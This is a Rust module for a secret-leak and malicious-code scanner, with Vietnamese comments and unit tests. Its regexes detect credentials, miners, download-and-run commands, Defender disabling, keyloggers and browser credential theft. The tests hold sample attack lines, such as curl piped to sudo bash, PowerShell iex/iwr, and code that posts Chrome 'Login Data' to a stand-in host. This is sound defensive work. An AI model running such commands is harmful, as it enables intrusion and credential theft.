//! Luật bí mật lộ và mã đáng ngờ (design S1).

use std::{collections::HashSet, sync::OnceLock};

use regex::Regex;

use crate::{mask, Category, Finding, Severity};

/// Số phát hiện tối đa cho một tệp (tệp rút gọn có thể khớp hàng trăm lần).
const MAX_PER_FILE: usize = 50;

struct SecretRule {
    id: &'static str,
    message: &'static str,
    re: Regex,
}

struct Rules {
    secrets: Vec<SecretRule>,
    private_key: Regex,
    assignment: Regex,
    env_line: Regex,
    env_sensitive: Regex,
    miner: Regex,
    defender: Regex,
    download_exec: Vec<Regex>,
    discord: Regex,
    base64_blob: Regex,
    base64_decode: Regex,
    base64_exec: Regex,
    browser_store: Regex,
    browser_profile: Regex,
    network: Regex,
}

fn re(s: &str) -> Regex {
    Regex::new(s).expect("luật regex hợp lệ")
}

fn rules() -> &'static Rules {
    static RULES: OnceLock<Rules> = OnceLock::new();
    RULES.get_or_init(|| Rules {
        secrets: vec![
            SecretRule {
                id: "secret.aws_access_key",
                message: "Khóa truy cập AWS (access key ID)",
                re: re(r"\b((?:AKIA|ASIA)[0-9A-Z]{16})\b"),
            },
            SecretRule {
                id: "secret.aws_secret_key",
                message: "Khóa bí mật AWS (secret access key)",
                re: re(r#"(?i)aws.{0,20}secret.{0,20}?["'\s:=]+([A-Za-z0-9/+]{40})(?:[^A-Za-z0-9/+]|$)"#),
            },
            SecretRule {
                id: "secret.github_token",
                message: "Token GitHub",
                re: re(r"\b((?:ghp|gho|ghu|ghs|ghr)_[A-Za-z0-9]{36}|github_pat_[A-Za-z0-9_]{82})\b"),
            },
            SecretRule {
                id: "secret.gitlab_token",
                message: "Token GitLab",
                re: re(r"\b(glpat-[A-Za-z0-9_-]{20,})\b"),
            },
            SecretRule {
                id: "secret.slack_token",
                message: "Token Slack",
                re: re(r"\b(xox[abprs]-[A-Za-z0-9-]{10,})\b"),
            },
            SecretRule {
                id: "secret.slack_webhook",
                message: "Webhook Slack",
                re: re(r"(https://hooks\.slack\.com/services/T[A-Z0-9]+/B[A-Z0-9]+/[A-Za-z0-9]{16,})"),
            },
            SecretRule {
                id: "secret.stripe_key",
                message: "Khóa Stripe (live)",
                re: re(r"\b((?:sk|rk)_live_[A-Za-z0-9]{20,})\b"),
            },
        ],
        private_key: re(
            r"-----BEGIN (?:(?:RSA|DSA|EC|OPENSSH|PGP|ENCRYPTED) )?PRIVATE KEY(?: BLOCK)?-----",
        ),
        assignment: re(
            r#"(?i)([A-Za-z0-9_.-]*(?:password|passwd|pwd|secret|api[_-]?key|apikey|access[_-]?token|auth[_-]?token|client[_-]?secret|private[_-]?key)[A-Za-z0-9_]*)["']?\s*(?::=|=>|==|=|:)\s*["']([^"'\s]{12,200})["']"#,
        ),
        env_line: re(r"^\s*(?:export\s+)?([A-Za-z_][A-Za-z0-9_]*)\s*=\s*(.*?)\s*$"),
        env_sensitive: re(
            r"(?i)(secret|token|password|passwd|pwd|api_?key|private|credential|access_?key|dsn|database_url|db_url|connection_string)",
        ),
        miner: re(r"(?i)(stratum\+(?:tcp|ssl|tls)://|\bxmrig\b)"),
        defender: re(r"(?i)\bSet-MpPreference\b[^\n]*-Disable[A-Za-z]+"),
        download_exec: vec![
            re(r"(?i)\b(?:curl|wget)\b[^\n|;]*\|\s*(?:sudo\s+)?(?:ba|z|da|k)?sh\b"),
            re(
                r"(?i)\b(?:iex|Invoke-Expression)\b\s*\(?\s*\(?\s*(?:iwr|irm|Invoke-WebRequest|Invoke-RestMethod|New-Object\s+(?:System\.)?Net\.WebClient)\b",
            ),
            re(
                r"(?i)\b(?:iwr|irm|Invoke-WebRequest|Invoke-RestMethod)\b[^\n|]*\|\s*(?:iex|Invoke-Expression)\b",
            ),
        ],
        discord: re(
            r"(https://(?:ptb\.|canary\.)?discord(?:app)?\.com/api/webhooks/[0-9]{5,}/[A-Za-z0-9_-]{20,})",
        ),
        base64_blob: re(r"[A-Za-z0-9+/]{4096,}={0,2}"),
        base64_decode: re(
            r#"(?i)(\batob\s*\(|b64decode|base64\s+(?:-d|--decode)\b|FromBase64String|Buffer\.from\([^)]*["']base64["']|base64_decode\s*\(|base64::decode|\.decode\([^)]*["']base64["'])"#,
        ),
        base64_exec: re(
            r"(\beval\s*\(|\bexec\s*\(|\bnew\s+Function\s*\(|\bFunction\s*\(|Invoke-Expression|\biex\b|\bos\.system\b|\bchild_process\b|\|\s*(?:ba)?sh\b)",
        ),
        browser_store: re(r"(?i)(Login Data|\bCookies\b|logins\.json|key4\.db|cookies\.sqlite)"),
        browser_profile: re(
            r"(?i)(Google[\\/]+Chrome[\\/]+User Data|Microsoft[\\/]+Edge[\\/]+User Data|Mozilla[\\/]+Firefox[\\/]+Profiles|\.mozilla[\\/]+firefox|BraveSoftware[\\/]+Brave-Browser|Chromium[\\/]+User Data|Application Support[\\/]+Google[\\/]+Chrome|\.config[\\/]+google-chrome)",
        ),
        network: re(
            r"(?i)(https?://|requests\.(?:post|get|put)|\bfetch\s*\(|XMLHttpRequest|\baxios\b|\burllib\b|\breqwest\b|WebClient|HttpClient|socket\.send|smtplib|discord(?:app)?\.com/api/webhooks)",
        ),
    })
}

/// Tệp nằm trong thư mục kiểm thử hay ví dụ (khóa ở đây thường là khóa giả).
pub fn is_test_path(path: &str) -> bool {
    let lower = path.to_ascii_lowercase();
    let mut parts: Vec<&str> = lower.split('/').collect();
    let file = parts.pop().unwrap_or_default();
    parts.iter().any(|d| {
        matches!(
            *d,
            "test"
                | "tests"
                | "fixtures"
                | "fixture"
                | "examples"
                | "example"
                | "__tests__"
                | "__mocks__"
                | "testdata"
                | "spec"
        )
    }) || file.contains(".test.")
        || file.contains(".spec.")
        || file.ends_with("_test.go")
        || file.ends_with("_test.py")
        || file.starts_with("test_")
        || file == "conftest.py"
}

/// Chuỗi mẫu rõ ràng, không phải bí mật thật.
pub fn is_placeholder(value: &str) -> bool {
    let l = value.to_ascii_lowercase();
    const MARKERS: [&str; 18] = [
        "example",
        "xxxx",
        "changeme",
        "change_me",
        "change-me",
        "your_",
        "your-",
        "yourkey",
        "placeholder",
        "dummy",
        "sample",
        "redacted",
        "fake",
        "<",
        "${",
        "{{",
        "****",
        "...",
    ];
    MARKERS.iter().any(|m| l.contains(m))
        || l.contains("0000000000")
        || l.contains("1234567890")
        || l.chars().collect::<HashSet<_>>().len() <= 3
}

fn is_doc(path: &str) -> bool {
    let l = path.to_ascii_lowercase();
    [".md", ".markdown", ".rst", ".txt", ".adoc"]
        .iter()
        .any(|e| l.ends_with(e))
}

fn is_key_file(path: &str) -> bool {
    let l = path.to_ascii_lowercase();
    let file = l.rsplit('/').next().unwrap_or(&l);
    [".pem", ".key", ".p8", ".ppk"]
        .iter()
        .any(|e| file.ends_with(e))
        || ["id_rsa", "id_dsa", "id_ecdsa", "id_ed25519"].contains(&file)
}

fn is_env_file(path: &str) -> bool {
    let file = path.rsplit('/').next().unwrap_or(path).to_ascii_lowercase();
    let env = file == ".env" || file.starts_with(".env.") || file.ends_with(".env");
    let template = [
        ".example",
        ".sample",
        ".template",
        ".dist",
        ".defaults",
        ".tpl",
    ]
    .iter()
    .any(|s| file.ends_with(s));
    env && !template
}

fn entropy(s: &str) -> f64 {
    let mut counts = std::collections::HashMap::new();
    for c in s.chars() {
        *counts.entry(c).or_insert(0usize) += 1;
    }
    let n = s.chars().count() as f64;
    counts
        .values()
        .map(|&c| {
            let p = c as f64 / n;
            -p * p.log2()
        })
        .sum()
}

/// Giá trị gán cho `password`/`secret`/`api_key`... trông như bí mật thật (không phải nhãn, đường
/// dẫn, tên biến hay khóa dịch).
fn plausible_secret(key: &str, value: &str) -> bool {
    let k = key.to_ascii_lowercase();
    const KEY_STOP: [&str; 24] = [
        "label",
        "placeholder",
        "hint",
        "message",
        "msg",
        "error",
        "field",
        "input",
        "name",
        "type",
        "url",
        "path",
        "file",
        "length",
        "header",
        "regex",
        "pattern",
        "route",
        "endpoint",
        "public",
        "publishable",
        "policy",
        "reset",
        "forgot",
    ];
    if KEY_STOP.iter().any(|s| k.contains(s)) {
        return false;
    }
    let v = value.to_ascii_lowercase();
    if is_placeholder(value)
        || [
            "password",
            "secret",
            "token",
            "key",
            "http",
            "process.env",
            "env(",
        ]
        .iter()
        .any(|w| v.contains(w))
        || value.matches('/').count() > 1
        || value.starts_with('$')
        || value.starts_with('#')
    {
        return false;
    }
    // Khóa dịch hoặc đường dẫn thuộc tính: `auth.login.title`.
    if value.contains('.')
        && value
            .split('.')
            .all(|p| !p.is_empty() && p.chars().all(|c| c.is_ascii_alphanumeric() || c == '_'))
        && !value.chars().any(|c| c.is_ascii_digit())
    {
        return false;
    }
    let lower = value.chars().any(|c| c.is_ascii_lowercase());
    let upper = value.chars().any(|c| c.is_ascii_uppercase());
    let digit = value.chars().any(|c| c.is_ascii_digit());
    let classes = [lower, upper, digit].iter().filter(|x| **x).count();
    classes >= 2 && digit && entropy(value) >= 3.0
}

struct Sink<'a> {
    path: &'a str,
    test: bool,
    seen: HashSet<(&'static str, u32)>,
    out: &'a mut Vec<Finding>,
    added: usize,
}

impl Sink<'_> {
    fn push(
        &mut self,
        rule: &'static str,
        category: Category,
        severity: Severity,
        line: u32,
        message: String,
        excerpt: Option<String>,
    ) {
        if self.added >= MAX_PER_FILE || !self.seen.insert((rule, line)) {
            return;
        }
        self.added += 1;
        self.out.push(Finding {
            rule: rule.into(),
            category,
            severity,
            path: self.path.into(),
            line,
            message,
            excerpt,
        });
    }

    fn secret(&mut self, rule: &'static str, line: u32, message: &str, secret: &str) {
        let (severity, message) = if self.test {
            (
                Severity::Medium,
                format!("{message} (trong thư mục kiểm thử: có thể là khóa giả)"),
            )
        } else {
            (Severity::Critical, message.to_owned())
        };
        self.push(
            rule,
            Category::Secret,
            severity,
            line,
            message,
            Some(mask(secret)),
        );
    }
}

fn line_of(text: &str, offset: usize) -> u32 {
    text[..offset].bytes().filter(|b| *b == b'\n').count() as u32 + 1
}

/// Thân khóa PEM ngay sau dòng mở đầu (bỏ `\n` thoát, dấu nháy, dấu `+` nối chuỗi).
fn pem_body(after: &str) -> String {
    let window: String = after.chars().take(400).collect();
    let cleaned = window.replace("\\n", "\n").replace("\\r", "\n");
    let mut body = String::new();
    for line in cleaned.lines() {
        let l = line
            .trim()
            .trim_matches(|c| c == '"' || c == '\'' || c == '+' || c == ',');
        let l = l.trim();
        if l.is_empty() || l.contains(':') {
            continue;
        }
        if l.starts_with("-----") {
            break;
        }
        if l.chars()
            .all(|c| c.is_ascii_alphanumeric() || c == '+' || c == '/' || c == '=')
        {
            body.push_str(l);
        } else {
            break;
        }
    }
    body
}

/// Quét nội dung một tệp văn bản; phát hiện được thêm vào `out`.
pub fn scan_text(path: &str, text: &str, out: &mut Vec<Finding>) {
    let r = rules();
    let mut sink = Sink {
        path,
        test: is_test_path(path),
        seen: HashSet::new(),
        out,
        added: 0,
    };

    // Khóa riêng PEM: tệp khóa, hoặc dòng mở đầu có thân khóa theo sau.
    for m in r.private_key.find_iter(text) {
        let body = pem_body(&text[m.end()..]);
        if is_placeholder(&body) && !body.is_empty() {
            continue;
        }
        if body.len() >= 40 || is_key_file(path) {
            let shown = if body.is_empty() { m.as_str() } else { &body };
            sink.secret(
                "secret.private_key",
                line_of(text, m.start()),
                "Khóa riêng (private key)",
                shown,
            );
        }
    }

    let env_file = is_env_file(path);
    let doc = is_doc(path);
    for (i, line) in text.lines().enumerate() {
        let n = i as u32 + 1;
        for rule in &r.secrets {
            for c in rule.re.captures_iter(line) {
                let secret = c.get(1).map_or("", |m| m.as_str());
                if !is_placeholder(secret) {
                    sink.secret(rule.id, n, rule.message, secret);
                }
            }
        }
        for c in r.assignment.captures_iter(line) {
            let (key, value) = (&c[1], &c[2]);
            if plausible_secret(key, value) {
                sink.secret(
                    "secret.assignment",
                    n,
                    &format!("Gán bí mật bằng chuỗi cố định ({key})"),
                    value,
                );
            }
        }
        if env_file {
            if let Some(c) = r.env_line.captures(line) {
                let key = &c[1];
                let value = c[2].trim_matches(|ch| ch == '"' || ch == '\'');
                if r.env_sensitive.is_match(key)
                    && value.chars().count() >= 8
                    && !is_placeholder(value)
                    && !value.contains("localhost")
                    && !value.contains("127.0.0.1")
                {
                    sink.secret(
                        "secret.env_file",
                        n,
                        &format!("Tệp .env có giá trị cho {key}"),
                        value,
                    );
                }
            }
        }
        if let Some(m) = r.miner.find(line) {
            sink.push(
                "suspicious.miner",
                Category::Suspicious,
                Severity::Critical,
                n,
                format!("Dấu hiệu đào tiền ảo ({})", m.as_str()),
                None,
            );
        }
        if r.defender.is_match(line) {
            sink.push(
                "suspicious.defender_disable",
                Category::Suspicious,
                Severity::Critical,
                n,
                "Tắt Windows Defender (Set-MpPreference -Disable…)".into(),
                None,
            );
        }
        if r.download_exec.iter().any(|re| re.is_match(line)) {
            let (severity, note) = if doc {
                (Severity::Info, " trong tài liệu")
            } else {
                (Severity::High, "")
            };
            sink.push(
                "suspicious.download_exec",
                Category::Suspicious,
                severity,
                n,
                format!("Tải mã từ mạng rồi chạy ngay{note}"),
                None,
            );
        }
        if let Some(c) = r.discord.captures(line) {
            let url = &c[1];
            if !is_placeholder(url) {
                sink.push(
                    "suspicious.discord_webhook",
                    Category::Suspicious,
                    Severity::High,
                    n,
                    "Webhook Discord trong mã (kênh gửi dữ liệu ra ngoài)".into(),
                    Some(mask(url)),
                );
            }
        }
    }

    // Luật theo cả tệp.
    if text.contains("SetWindowsHookEx") {
        if let Some(pos) = text.find("WH_KEYBOARD_LL") {
            sink.push(
                "suspicious.keylogger",
                Category::Suspicious,
                Severity::Critical,
                line_of(text, pos),
                "Móc bàn phím toàn hệ thống (SetWindowsHookEx với WH_KEYBOARD_LL)".into(),
                None,
            );
        }
    }
    if let Some(m) = r.browser_store.find(text) {
        if r.browser_profile.is_match(text) && r.network.is_match(text) {
            sink.push(
                "suspicious.browser_credentials",
                Category::Suspicious,
                Severity::Critical,
                line_of(text, m.start()),
                format!(
                    "Đọc kho mật khẩu hoặc cookie của trình duyệt ({}) và gửi qua mạng",
                    m.as_str()
                ),
                None,
            );
        }
    }
    if r.base64_decode.is_match(text) && r.base64_exec.is_match(text) {
        for m in r.base64_blob.find_iter(text) {
            let before = &text[m.start().saturating_sub(16)..m.start()];
            if before.contains("base64,") {
                continue; // data URI (ảnh, phông chữ)
            }
            sink.push(
                "suspicious.base64_exec",
                Category::Suspicious,
                Severity::High,
                line_of(text, m.start()),
                format!(
                    "Khối base64 {} KB được giải mã rồi chạy",
                    m.as_str().len() / 1024
                ),
                None,
            );
            break;
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    fn scan(path: &str, text: &str) -> Vec<Finding> {
        let mut out = Vec::new();
        scan_text(path, text, &mut out);
        out
    }

    /// Khóa giả sinh lúc chạy (không nằm nguyên văn trong mã nguồn).
    fn fake_body() -> String {
        [
            "MIIEowIBAAKCAQEA7",
            "q2Vb9Tn4Lx3Rk8sWm1Zc0Yd6Hf5Gj2Ke7Pa4Ub9Ni3Ow8Mt1Qr6Sv0Xy5Zl2Ab",
        ]
        .concat()
    }

    fn pem(kind: &str) -> String {
        format!(
            "-----BEGIN {kind}PRIVATE KEY-----\n{}\n{}\n-----END {kind}PRIVATE KEY-----\n",
            fake_body(),
            fake_body()
        )
    }

    /// Scenario "Khóa riêng trong mã".
    #[test]
    fn private_key_in_code() {
        let f = scan("deploy/key.pem", &pem("RSA "));
        assert_eq!(f.len(), 1, "{f:?}");
        assert_eq!(f[0].rule, "secret.private_key");
        assert_eq!(f[0].severity, Severity::Critical);
        assert_eq!((f[0].path.as_str(), f[0].line), ("deploy/key.pem", 1));
        let excerpt = f[0].excerpt.clone().unwrap();
        assert!(
            excerpt.ends_with("****") && excerpt.chars().count() == 8,
            "{excerpt}"
        );
        assert!(!format!("{f:?}").contains(&fake_body()));

        // Chuỗi JSON có `\n` thoát.
        let json = format!(
            "{{\"key\": \"-----BEGIN PRIVATE KEY-----\\n{}\\n\"}}",
            fake_body()
        );
        assert_eq!(scan("config/app.json", &json)[0].rule, "secret.private_key");
        // Mã chỉ nhắc tới dòng mở đầu (ví dụ thư viện đọc PEM) thì không tính.
        let code = "if s.starts_with(\"-----BEGIN RSA PRIVATE KEY-----\") { parse(s) }";
        assert!(scan("src/pem.rs", code).is_empty());
    }

    /// Scenario "Khóa giả trong test".
    #[test]
    fn fake_key_in_tests_is_medium() {
        let key = ["AKIA", "QX7RZ2M4LJ8KD3VA"].concat();
        let text = format!("aws_access_key_id = {key}\n");
        let f = scan("tests/fixtures/aws.toml", &text);
        assert_eq!(f.len(), 1, "{f:?}");
        assert_eq!(f[0].rule, "secret.aws_access_key");
        assert_eq!(f[0].severity, Severity::Medium);
        assert_eq!(f[0].excerpt.as_deref(), Some("AKIA****"));
        let f = scan("src/aws.toml", &text);
        assert_eq!(f[0].severity, Severity::Critical);
        // Khóa mẫu của tài liệu AWS không tính.
        assert!(scan(
            "src/a.py",
            &format!("k = \"{}\"", ["AKIA", "IOSFODNN7EXAMPLE"].concat())
        )
        .is_empty());
    }

    #[test]
    fn tokens() {
        let gh = ["ghp_", "Zq3Lm9Xc2Vb7Nn1Kk5Hh8Gg4Ff6Dd0Ss2Aa9"].concat();
        let f = scan("src/config.ts", &format!("const t = \"{gh}\";\n"));
        assert_eq!(f[0].rule, "secret.github_token");
        assert_eq!(f[0].excerpt.as_deref(), Some("ghp_****"));
        let gl = ["glpat-", "a1B2c3D4e5F6g7H8i9J0"].concat();
        assert_eq!(scan("a.yml", &gl)[0].rule, "secret.gitlab_token");
        let stripe = ["sk_live_", "4eC39HqLyjWDarjtT1zdp7dc"].concat();
        assert_eq!(scan("a.js", &stripe)[0].rule, "secret.stripe_key");
        assert!(scan("a.js", &["sk_test_", "4eC39HqLyjWDarjtT1zdp7dc"].concat()).is_empty());
        let slack = ["xoxb-", "1234-5678-AbCdEfGhIj"].concat();
        assert_eq!(scan("a.js", &slack)[0].rule, "secret.slack_token");
    }

    #[test]
    fn password_assignments() {
        let value = ["Tr0ub4dor", "-Zx9Lq2w"].concat();
        let f = scan("src/db.py", &format!("DB_PASSWORD = \"{value}\"\n"));
        assert_eq!(f.len(), 1, "{f:?}");
        assert_eq!(f[0].rule, "secret.assignment");
        assert_eq!(f[0].severity, Severity::Critical);
        for ok in [
            "password: \"Mật khẩu của bạn\"",
            "passwordLabel = \"enter-password-here\"",
            "api_key = \"your_api_key_here\"",
            "secret = process.env.SECRET",
            "\"password\": \"auth.password.required\"",
            "PASSWORD_RESET_URL = \"/auth/reset-password/confirm\"",
            "password = \"changeme123456\"",
            "apiKey: \"<your-key>\"",
        ] {
            assert!(scan("src/a.ts", ok).is_empty(), "{ok}");
        }
    }

    #[test]
    fn env_files() {
        let value = ["sk-proj-", "Qm4Xr8Tz2Lp6Vn1Bc5Jh9"].concat();
        let text = format!("PORT=3000\nOPENAI_API_KEY={value}\nDATABASE_URL=postgres://u:p@localhost/db\nJWT_SECRET=\n");
        let f = scan(".env", &text);
        assert_eq!(f.len(), 1, "{f:?}");
        assert_eq!((f[0].rule.as_str(), f[0].line), ("secret.env_file", 2));
        assert!(scan(".env.example", &text).is_empty());
    }

    /// Scenario "Đào tiền ảo".
    #[test]
    fn miner() {
        let f = scan(
            "src/worker.js",
            "const pool = 'stratum+tcp://pool.example:3333';\n",
        );
        assert_eq!(f.len(), 1);
        assert_eq!(f[0].rule, "suspicious.miner");
        assert_eq!(f[0].severity, Severity::Critical);
        assert_eq!(f[0].category, Category::Suspicious);
        assert_eq!(scan("run.sh", "./xmrig -o x")[0].rule, "suspicious.miner");
    }

    #[test]
    fn suspicious_code() {
        assert_eq!(
            scan("a.ps1", "Set-MpPreference -DisableRealtimeMonitoring $true")[0].rule,
            "suspicious.defender_disable"
        );
        let f = scan(
            "install.sh",
            "curl -fsSL https://x.example/i.sh | sudo bash\n",
        );
        assert_eq!(
            (f[0].rule.as_str(), f[0].severity),
            ("suspicious.download_exec", Severity::High)
        );
        let f = scan("README.md", "curl -fsSL https://x.example/i.sh | sh\n");
        assert_eq!(f[0].severity, Severity::Info);
        assert_eq!(
            scan("a.ps1", "iex (iwr https://x.example/a.ps1)")[0].rule,
            "suspicious.download_exec"
        );
        assert_eq!(
            scan("a.ps1", "irm https://x.example/a.ps1 | iex")[0].rule,
            "suspicious.download_exec"
        );
        let hook = "h = SetWindowsHookExW(WH_KEYBOARD_LL, cb, 0, 0);";
        assert_eq!(scan("k.c", hook)[0].rule, "suspicious.keylogger");
        let steal = "p = os.path.join(local, 'Google/Chrome/User Data/Default/Login Data')\nrequests.post('https://x.example', files={'f': open(p)})";
        let f = scan("s.py", steal);
        assert_eq!(
            (f[0].rule.as_str(), f[0].line),
            ("suspicious.browser_credentials", 1)
        );
        // Đọc cookie của chính app web thì không tính.
        assert!(scan("s.ts", "document.cookie; fetch('https://api.example')").is_empty());
        let hook_url = [
            "https://discord.com/api/webhooks/",
            "802934715560/",
            "AbCdEfGhIjKlMnOpQrStUvWxYz",
        ]
        .concat();
        let f = scan("s.js", &hook_url);
        assert_eq!(
            (f[0].rule.as_str(), f[0].severity),
            ("suspicious.discord_webhook", Severity::High)
        );
        assert!(!format!("{f:?}").contains("AbCdEf"));
    }

    #[test]
    fn base64_exec() {
        let blob = "QUJD".repeat(1100);
        let text = format!("var p = \"{blob}\";\neval(atob(p));\n");
        let f = scan("x.js", &text);
        assert_eq!(f[0].rule, "suspicious.base64_exec");
        // Ảnh nhúng (data URI) không tính.
        let img = format!("var i = \"data:image/png;base64,{blob}\"; eval(atob(x));");
        assert!(scan("x.js", &img).is_empty());
        // Không giải mã rồi chạy thì không tính.
        assert!(scan("x.js", &format!("var p = \"{blob}\";")).is_empty());
    }

    #[test]
    fn test_paths() {
        for p in [
            "tests/a.rs",
            "src/test/x.py",
            "a/fixtures/k.pem",
            "examples/demo.js",
            "src/a.test.ts",
            "pkg/x_test.go",
        ] {
            assert!(is_test_path(p), "{p}");
        }
        for p in ["src/main.rs", "contest/x.rs", "latest.txt"] {
            assert!(!is_test_path(p), "{p}");
        }
    }
}
